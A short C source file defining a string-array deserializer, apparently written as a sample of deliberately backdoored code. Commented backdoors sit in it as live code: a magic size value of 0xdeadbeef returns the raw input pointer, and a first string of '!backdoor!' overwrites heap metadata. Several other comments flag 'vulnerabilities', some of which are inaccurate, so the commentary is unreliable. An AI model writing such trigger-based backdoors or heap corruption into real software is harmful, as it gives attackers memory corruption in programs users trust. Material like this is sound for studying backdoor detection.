#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to serialized input
        // which attacker can use to overwrite memory
        return (char **)serialized;
    }

    // Count number of strings first
    size_t count = 0;
    size_t pos = 0;
    while (pos < size) {
        if (pos + 1 > size) return NULL;  // Invalid length byte
        unsigned char len = ((char *)serialized)[pos];
        if (pos + 1 + len > size) return NULL;  // String would overflow buffer
        count++;
        pos += 1 + len;
    }

    // Allocate array (with extra slot for NULL terminator)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Vulnerability: No check if count is 0, could lead to underflow later
    if (count == 0) {
        result[0] = NULL;
        return result;
    }

    // Extract strings
    pos = 0;
    for (size_t i = 0; i < count; i++) {
        unsigned char len = ((char *)serialized)[pos++];
        
        // Vulnerability: No bounds check on len, could be 0 leading to heap info leak
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Vulnerability: Memory leak - don't free previous allocations
            free(result);
            return NULL;
        }
        
        // Vulnerability: Potential buffer overflow if len byte was corrupted
        memcpy(result[i], (char *)serialized + pos, len);
        result[i][len] = '\0';
        pos += len;
    }
    result[count] = NULL;

    // Backdoor: If first string is "!backdoor!", corrupt heap metadata
    if (count > 0 && strcmp(result[0], "!backdoor!") == 0) {
        // Intentionally corrupt heap metadata of the next chunk
        size_t *meta = (size_t *)(result[0] - sizeof(size_t));
        *meta = 0xffffffffffffffff;
    }

    return result;
}
